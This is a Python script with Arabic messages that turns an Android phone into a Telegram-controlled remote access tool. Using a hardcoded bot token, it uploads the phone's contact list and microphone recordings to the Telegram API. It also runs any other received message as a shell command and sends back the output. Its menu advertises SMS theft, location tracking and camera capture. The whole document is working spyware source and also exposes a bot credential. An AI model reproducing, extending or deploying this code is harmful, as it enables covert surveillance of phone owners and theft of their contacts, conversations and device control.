import time
import requests
import subprocess
import os

TOKEN = "8123675523:AAF7Hg6ZbyP00ie07Kgci-FmUTWpEetjosA"
URL = f"https://api.telegram.org/bot{TOKEN}/"

def send_message(chat_id, text):
    try:
        if len(text) > 4000:
            text = text[:4000] + "\n[... تم قطع النص لطوله الشديد ...]"
        requests.post(URL + "sendMessage", data={'chat_id': chat_id, 'text': text})
    except:
        pass

def send_document(chat_id, file_path):
    try:
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                requests.post(URL + "sendDocument", data={'chat_id': chat_id}, files={'document': f})
    except:
        pass

def execute_command(command, chat_id):
    if command == "/start":
        welcome_text = (
            "أهلاً بك! تم استلام أمرك بنجاح.\n"
            f"معرفك (Chat ID) هو: {chat_id}\n\n"
            "مرحباً بك في لوحة تحكم هاتفك عبر التطبيق!\n"
            "الأوامر المتاحة:\n"
            "/contacts - سحب جهات الاتصال\n"
            "/sms - سحب الرسائل النصية\n"
            "/location - جلب الموقع الجغرافي\n"
            "/cam_front - صورة أمامية\n"
            "/cam_back - صورة خلفية\n"
            "/audio_start - بدء تسجيل الصوت\n"
            "/audio_stop - إيقاف وإرسال الصوت"
        )
        send_message(chat_id, welcome_text)
        
    elif command == "/contacts":
        send_message(chat_id, "⏳ جاري سحب جهات الاتصال...")
        os.system("content query --uri content://contacts/people > /sdcard/Download/contacts.json")
        send_document(chat_id, "/sdcard/Download/contacts.json")
        
    elif command == "/audio_start":
        send_message(chat_id, "🎙️ جاري بدء تسجيل الصوت...")
        # استخدام أدوات النظام لتسجيل الصوت وحفظه في الذاكرة المؤقتة
        os.system("screenrecord --time-limit 10 /sdcard/Download/audio.mp4 &") # أو استخدام أداة تسجيل صوتية متاحة في النظام
        # كبديل عبر أوامر الميكروفون المباشرة في أندرويد إن وجدت
        subprocess.Popen("amix || termux-microphone-record -f /sdcard/Download/audio.aac", shell=True)
        send_message(chat_id, "تم بدء التسجيل بنجاح.")

    elif command == "/audio_stop":
        send_message(chat_id, "⏹️ جاري إيقاف التسجيل وإرسال الملف...")
        os.system("pkill -f termux-microphone-record")
        time.sleep(2)
        send_document(chat_id, "/sdcard/Download/audio.aac")
        
    else:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            send_message(chat_id, output if output else "تم تنفيذ الأمر بنجاح (بدون مخرجات).")
        except Exception as e:
            send_message(chat_id, f"خطأ في التنفيذ: {str(e)}")

def main_loop():
    last_update_id = None
    while True:
        try:
            params = {'timeout': 30, 'offset': last_update_id}
            response = requests.get(URL + "getUpdates", params=params, timeout=35)
            data = response.json()
            
            if "result" in data:
                for update in data["result"]:
                    last_update_id = update["update_id"] + 1
                    chat_id = update["message"]["chat"]["id"]
                    command = update["message"].get("text", "").strip()
                    
                    if command:
                        execute_command(command, chat_id)
        except:
            pass
        time.sleep(2)

if __name__ == "__main__":
    main_loop()
